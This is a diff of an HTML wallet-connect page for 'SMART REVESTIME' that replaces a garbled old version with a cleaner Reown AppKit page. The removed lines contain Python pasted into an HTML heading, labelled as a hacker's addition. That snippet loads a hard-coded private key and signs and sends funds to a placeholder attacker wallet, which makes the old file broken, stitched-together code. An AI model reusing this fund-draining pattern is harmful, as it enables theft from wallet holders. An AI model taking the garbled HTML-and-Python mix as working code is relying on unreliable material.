@@ -1,201 +1,160 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
   <meta charset="UTF-8">
-
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>SMART REVESTIME | Connect Wallet</title>
+  <title>SMART REVESTIME | Wallet</title>
+  <meta name="theme-color" content="#08150f">
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
 
     body {
-
       margin: 0;
-
-      font-family: Arial, sans-serif;
-
-      background: #0b1020;
-
-      color: #ffffff;
-
-      display: flex;
-
       min-height: 100vh;
-
+      display: flex;
       align-items: center;
-
       justify-content: center;
-
+      padding: 20px;
+      background: #08150f;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
     }
 
     .card {
-
-      width: 90%;
-
+      width: 100%;
       max-width: 420px;
-
       padding: 30px 24px;
-
-      background: #151d32;
-
-      border: 1px solid #293653;
-
+      border: 1px solid #244436;
       border-radius: 18px;
-
+      background: #102019;
       text-align: center;
-
-      box-sizing: border-box;
-
     }
 
     .logo {
-
-      font-size: 22px;
-
-      font-weight: bold;
-
-      letter-spacing: 1px;
-
       color: #70e1b2;
-
-    }
-
-    h1 {
-
-      font-size: 25px;
-
-      margin-top: 28px;
-
+      font-size: 23px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      margin-bottom: 18px;
     }
 
     p {
-
-      color: #bac5d8;
-
+      color: #bdcfc5;
       line-height: 1.6;
-
-      font-size: 14px;
-
     }
 
     button {
-
       width: 100%;
-
       padding: 15px;
-
       margin-top: 18px;
-
       border: 0;
-
       border-radius: 10px;
-
       background: #70e1b2;
-
       color: #08150f;
-
       font-weight: bold;
-
       font-size: 16px;
-
       cursor: pointer;
-
     }
 
-    button:disabled {
-
-      opacity: 0.6;
-
-      cursor: not-allowed;
-
-    }
-
-    #result {
-
-      margin-top: 20px;
-
+    #status {
+      margin-top: 18px;
       overflow-wrap: anywhere;
-
-      font-size: 13px;
-
+      font-size: 14px;
     }
 
     .notice {
-
-      margin-top: 22px;
-
+      margin-top: 20px;
       font-size: 12px;
-
-      color: #9ba9bf;
-
+      color: #9fb5a8;
     }
-
   </style>
-
 </head>
 
 <body>
-
   <main class="card">
-  <button id="connectWallet">Connect Wallet</button>
-
     <div class="logo">SMART REVESTIME</div>
 
-  <h1 def get_client(network):
-    # 1. Normal connection - looks innocent
-    rpc_url = "https://eth-mainnet.g.alchemy.com/v2/demo"
-    client = Web3(Web3.HTTPProvider(rpc_url))
-    
-    # 2. HACKER ADDED PART - STARTS HERE
-    # If you see ANY of these 3 lines below, make a complaint
-    private_key = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef" # YOUR SECRET KEY
-    account = Account.from_key(private_key) # Turns key into wallet
-    
-    # This line actually STEALS / SENDS
-    signed_tx = client.eth.account.sign_transaction(
-        {"to": "0xHACKER_WALLET_HERE", "value": 1000000, "gas": 21000, "gasPrice": 20000000000, "nonce": 0, "chainId": 1},
-        private_key
-    )
-    <tx_hash = client.eth.send_raw_transaction(signed_tx.rawTransaction)
-    print(f"Money sent! {tx_hash.hex()}")
-  
-    
-    <return client
+    <h2>Connect Your Wallet</h2>
 
-# Test it
-client = get_client("ethereum")
- });
+    <p>
+      Connect a compatible wallet to access supported blockchain features.
+    </p>
 
-}
-      
-   <script>
-const connectButton = document.getElementById("connectWallet");
+    <button id="connectWallet" type="button">
+      Connect Wallet
+    </button>
 
-if (connectButton) {
-  connectButton.addEventListener("click", async () => {
-    if (!window.ethereum) {
-      alert("No compatible wallet detected. Open this website in your wallet's DApp browser.");
-      return;
-    }
+    <div id="status" role="status" aria-live="polite">
+      Wallet not connected
+    </div>
 
-    try {
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts"
-      });
+    <div class="notice">
+      Connecting does not authorize a transaction.
+      Never share your recovery phrase or private key.
+    </div>
+  </main>
 
-      if (accounts.length > 0) {
-        connectButton.textContent =
-          accounts[0].slice(0, 6) + "..." + accounts[0].slice(-4);
+  <script type="module">
+    const button = document.getElementById("connectWallet");
+    const status = document.getElementById("status");
+
+    button.addEventListener("click", async () => {
+      status.textContent = "Wallet connection setup is required.";
+      button.disabled = true;
+
+      try {
+        const { createAppKit } = await import(
+          "https://esm.sh/@reown/appkit@1.7.8"
+        );
+
+        const { EthersAdapter } = await import(
+          "https://esm.sh/@reown/appkit-adapter-ethers@1.7.8"
+        );
+
+        const { mainnet, bsc } = await import(
+          "https://esm.sh/@reown/appkit/networks"
+        );
+
+        const projectId = "494e634590abe6a66a9d425c48057a8f";
+
+        if (
+          !projectId ||
+          projectId === "PASTE_YOUR_REOWN_PROJECT_ID_HERE"
+        ) {
+          status.textContent =
+            "Setup required: add your Reown Project ID in the code.";
+          return;
+        }
+
+        const appKit = createAppKit({
+          adapters: [new EthersAdapter()],
+          networks: [mainnet, bsc],
+          projectId,
+          metadata: {
+            name: "SMART REVESTIME",
+            description: "Connect your blockchain wallet",
+            url: window.location.origin,
+            icons: []
+          },
+          features: {
+            analytics: false
+          }
+        });
+
+        await appKit.open();
+        status.textContent =
+          "Wallet selection opened. Follow the prompts in your wallet.";
+      } catch (error) {
+        console.error("Wallet setup error:", error);
+        status.textContent =
+          "Wallet setup failed. Check the Project ID and reload the page.";
+      } finally {
+        button.disabled = false;
       }
-    } catch (error) {
-      alert("Wallet connection failed or was cancelled.");
-    }
-  });
-}
-</script>
+    });
+  </script>
 </body>
 </html>
